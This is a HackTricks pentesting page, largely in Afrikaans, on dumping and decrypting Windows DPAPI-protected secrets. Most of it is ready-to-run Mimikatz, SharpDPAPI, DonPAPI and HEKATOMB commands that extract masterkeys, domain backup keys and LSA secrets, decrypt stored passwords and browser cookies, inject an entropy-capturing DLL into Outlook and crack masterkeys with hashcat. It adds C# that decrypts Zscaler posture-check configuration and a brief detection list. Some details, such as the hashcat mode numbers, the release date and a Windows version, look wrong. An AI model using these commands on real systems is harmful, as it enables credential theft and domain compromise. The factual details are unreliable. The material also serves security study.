# DPAPI - Wagwoorde uittrek

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **symmetriese enkripsie van asymmetriese private sleutels**, en maak gebruik van óf gebruiker- óf stelselgeheime as 'n belangrike bron van entropie. Hierdie benadering vereenvoudig enkripsie vir ontwikkelaars deur hulle in staat te stel om data te enkripteer met 'n sleutel wat afgelei is van die gebruiker se aanmeldgeheime of, vir stelsel-enkripsie, die stelsel se domeinverifikasie-geheime, sodat ontwikkelaars nie self die beskerming van die enkripsiesleutel hoef te bestuur nie.

Die mees algemene manier om DPAPI te gebruik is deur die **`CryptProtectData` and `CryptUnprotectData`** funksies, wat toepassings toelaat om data veilig te enkripteer en dekripteer met die sessie van die proses wat tans aangemeld is. Dit beteken dat die geënkripteerde data slegs gedekripteer kan word deur dieselfde gebruiker of stelsel wat dit geënkripteer het.

Verder aanvaar hierdie funksies ook 'n **`entropy` parameter** wat tydens enkripsie en dekripsie gebruik sal word, dus om iets te dekripteer wat met hierdie parameter geënkripteer is, moet jy dieselfde entropie-waarde verskaf wat tydens enkripsie gebruik is.

### Gebruikersleutelgenerering

Die DPAPI genereer 'n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hul geloofsbriewe. Hierdie sleutel word afgelei van die gebruiker se wagwoord en ander faktore en die algoritme hang af van die tipe gebruiker maar eindig as 'n SHA1. Byvoorbeeld, vir domeingebruikers, **hang dit af van die NTLM hash van die gebruiker**.

Dit is besonders interessant omdat as 'n aanvaller die gebruiker se wagwoord-hash kan bekom, hulle kan:

- **Enkripteer enige data wat met DPAPI geënkripteer is** met daardie gebruiker se sleutel sonder om enige API te kontak
- Probeer om die **wagwoord offline te kraak** deur te probeer om die geldige DPAPI-sleutel te genereer

Boonop, elke keer as 'n gebruiker data enkripteer met DPAPI, word 'n nuwe **master key** gegenereer. Hierdie master key is die een wat eintlik gebruik word om data te enkripteer. Elke master key kry 'n **GUID** (Globally Unique Identifier) wat dit identifiseer.

Die master sleutels word gestoor in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** gids, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master sleutel word geënkripteer gestoor deur die gebruiker se **`pre-key`** en ook deur 'n **domain backup key** vir herstel (dus word dieselfde sleutel twee keer geënkripteer gestoor met twee verskillende pas).

Let daarop dat die **domein sleutel wat gebruik word om die master sleutel te enkripteer in die domain controllers is en nooit verander nie**, so as 'n aanvaller toegang tot die domain controller het, kan hulle die domein backup key herwin en die master sleutels van alle gebruikers in die domein dekripteer.

Die geënkripteerde blobs bevat die **GUID van die master key** wat gebruik is om die data binne-in hul headers te enkripteer.

> [!TIP]
> DPAPI geënkripteerde blobs begin met **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Dit is die sleutel wat deur die masjien gebruik word om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat 'n spesiale sleutel is waartoe slegs die SYSTEM-gebruiker toegang het. Hierdie sleutel word gebruik om data te enkripteer wat deur die stelsel self beskikbaar moet wees, soos masjienvlak-aanmeldbewyse of stelselwye geheime.

Neem kennis dat hierdie sleutels **nie 'n domain backup het nie**, en dus slegs plaaslik toeganklik is:

- **Mimikatz** kan dit bekom deur LSA secrets te dump met die opdrag: `mimikatz lsadump::secrets`
- Die geheim word in die register gestoor, so 'n administrateur kan **DACL-permissies wysig om toegang daartoe te kry**. Die registerpad is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows creds
- Internet Explorer- en Google Chrome-wagwoorde en outo-voltooiingsdata
- E-pos en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke, en Windows Vault, insluitend enkripsiesleutels
- Wagwoorde vir remote desktop-verbindinge, .NET Passport, en private sleutels vir verskeie enkripsie- en verifikasiedoeleindes
- Netwerkwagwoorde wat deur Credential Manager bestuur word en persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger, en meer
- Gekodeerde blobs binne die register
- ...

Stelselbeskermde data sluit in:
- Wi‑Fi-wagwoorde
- Wagwoorde van geskeduleerde take
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met local admin privileges is dit moontlik om **access the LSASS memory** om die DPAPI master keys van alle gekoppelde gebruikers en die SYSTEM key uit te trek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike adminregte het, kan hulle toegang kry tot die **DPAPI_SYSTEM LSA secret** om die machine master keys te ontsleutel:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die password of hash NTLM van die gebruiker bekend is, kan jy **decrypt the master keys of the user directly**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy binne 'n sessie as die gebruiker is, is dit moontlik om die DC te vra vir die **backup key to decrypt the master keys using RPC**. As jy local admin is en die gebruiker aangemeld is, kan jy daarvoor **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI-versleutelde data

### Vind DPAPI-versleutelde data

Gewoonlik word gebruikers se **beskermde lêers** gevind in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kontroleer ook om `\Roaming\` na `\Local\` te verander in die bogenoemde paaie.

Voorbeelde van enumerering:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-geënkripteerde blobs in die lêerstelsel, registry en B64-blobs vind:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let wel dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (uit dieselfde repo) gebruik kan word om sensitiewe data wat met DPAPI versleuteld is, soos cookies, te ontsleutel.

### Toegangssleutels en data

- **Gebruik SharpDPAPI** om inlogbewyse te kry uit DPAPI-geënkripteerde lêers van die huidige sessie:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials info** soos die encrypted data en die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Toegang tot masterkeys**:

Dekripteer 'n masterkey van 'n gebruiker wat die **domain backup key** versoek deur RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-hulpmiddel ondersteun ook hierdie argumente vir masterkey decryption (let op hoe dit moontlik is om `/rpc` te gebruik om die domain se backup key te kry, `/password` om 'n plaintext password te gebruik, of `/pvk` om 'n DPAPI domain private key file te spesifiseer...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrypt data met 'n masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-instrument ondersteun ook hierdie argumente vir die ontsleuteling van `credentials|vaults|rdg|keepass|triage|blob|ps` (let daarop dat dit moontlik is om `/rpc` te gebruik om die domein se rugsteunsleutel te kry, `/password` om 'n wagwoord in platte teks te gebruik, `/pvk` om 'n DPAPI-domein private key-lêer te spesifiseer, `/unprotect` om die huidige gebruiker se sessie te gebruik...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Ontsleutel sommige data met behulp van **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Hantering van Opsionele **entropy** ("Third-party entropy")

Sommige toepassings stuur 'n bykomende **entropy** waarde na `CryptProtectData`. Sonder hierdie waarde kan die blob nie gedekripteer word nie, selfs al is die korrekte masterkey bekend. Die verkryging van die **entropy** is daarom noodsaaklik wanneer jy fokus op credentials wat op hierdie wyse beskerm is (bv. Microsoft Outlook, sommige VPN-kliente).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is 'n user-mode DLL wat die DPAPI-funksies binne die teikenproses hook en deursigtig enige opsionele **entropy** wat voorsien word opneem. Deur EntropyCapture in DLL-injection mode teen prosesse soos `outlook.exe` of `vpnclient.exe` te laat loop, sal dit 'n lêer skep wat elke **entropy**-buffer aan die oproepende proses en blob koppel. Die vasgevangde **entropy** kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) voorsien word om die data te ontsleutel.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys vanlyn (Hashcat & DPAPISnoop)

Microsoft het 'n **context 3** masterkey-formaat bekendgestel, beginnende met Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-accelerated cracking of user passwords directly from the masterkey file toelaat. Aanvallers kan dus word-list of brute-force attacks uitvoer sonder om met die target system te kommunikeer.

`DPAPISnoop` (2024) automatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die hulpmiddel kan ook Credential- en Vault-blobs analiseer, dit met cracked keys ontsleutel en cleartext passwords uitvoer.


### Toegang tot data van ander masjiene

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`** opsie aandui om toegang tot 'n afgeleë masjien se data te kry. Natuurlik moet jy daardie masjien kan bereik, en in die volgende voorbeeld word veronderstel dat die **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander gereedskap

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n hulpmiddel wat die uittrekking van alle gebruikers en rekenaars uit die LDAP-gids en die uittrekking van domain controller backup key deur RPC outomatiseer. Die script sal dan alle rekenaars se IP-adresse oplos en 'n smbclient op alle rekenaars uitvoer om alle DPAPI blobs van alle gebruikers te verkry en alles met domain backup key te ontsleutel.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die uit die LDAP onttrekte rekenaarslys kan jy elke subnet vind selfs al het jy dit nie geken nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan outomaties geheime wat deur DPAPI beskerm word dump. Die 2.x-uitgawe het die volgende geïntroduceer:

* Parallelle versameling van blobs vanaf honderde hosts
* Ontleding van **context 3** masterkeys en outomatiese Hashcat-krakingintegrasie
* Ondersteuning vir Chrome "App-Bound" encrypted cookies (sien volgende afdeling)
* 'n nuwe **`--snapshot`**-modus om herhaaldelik eindpunte te peil en nuut-geskepte blobs te diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-ontleder vir masterkey/credential/vault-lêers wat Hashcat/JtR-formate kan uitvoer en opsioneel outomaties kraking kan aanroep. Dit ondersteun volledig machine- en user masterkey-formate tot Windows 11 24H1.


## Algemene opsporings

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante gidse.
- Veral vanaf 'n netwerk-share soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke gereedskap om toegang tot LSASS-geheue te kry of masterkeys te dump.
- Gebeurtenis **4662**: *An operation was performed on an object* – kan gekorreleer word met toegang tot die **`BCKUPKEY`**-voorwerp.
- Gebeurtenis **4673/4674** wanneer 'n proses die versoek doen van *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023–2025 kwesbaarhede en ekosisteemveranderinge

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Aanvaller met netwerktoegang kon 'n domain member mislei om 'n kwaadwillige DPAPI backup key te haal, wat dekripsie van user masterkeys toegelaat het. Gemaak reg in die November 2023 kumulatiewe opdatering – administrateurs moet verseker dat DCs en workstations volledig gepatch is.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) het die ou DPAPI-only beskerming vervang met 'n bykomende sleutel wat onder die gebruiker se **Credential Manager** gestoor word. Offline-dekripsie van koekies vereis nou beide die DPAPI masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra sleutel herstel wanneer hulle in user context loop.


### Gevalstudie: Zscaler Client Connector – Aangepaste entropie afgelei van SID

Zscaler Client Connector stoor verskeie konfigurasielêers onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer is versleuteld met **DPAPI (Machine scope)** maar die vendor verskaf **custom entropy** wat *by runtime bereken* word in plaas daarvan om op skyf gestoor te word.

Die entropie word heropgebou uit twee elemente:

1. 'n hard-coded geheim ingebed in `ZSACredentialProvider.dll`.
2. Die **SID** van die Windows-rekening waartoe die konfigurasie behoort.

Die algoritme wat deur die DLL geïmplementeer word is ekwivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in 'n DLL ingebed is wat vanaf die skyf gelees kan word, kan enige plaaslike attacker met SYSTEM rights die entropie vir enige SID hergenereer en die blobs offline ontsleutel:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Ontsleuteling lewer die volledige JSON-konfigurasie, insluitend elke **toestel-houdingstoets** en die verwagte waarde daarvan – inligting wat baie waardevol is wanneer kliëntkant-omseilings probeer word.

> WENK: die ander geënkripteerde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) is beskerm met DPAPI **sonder** entropie (`16` nulbytes). Daarom kan hulle direk ontsleutel word met `ProtectedData.Unprotect` sodra SYSTEM privileges verkry is.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
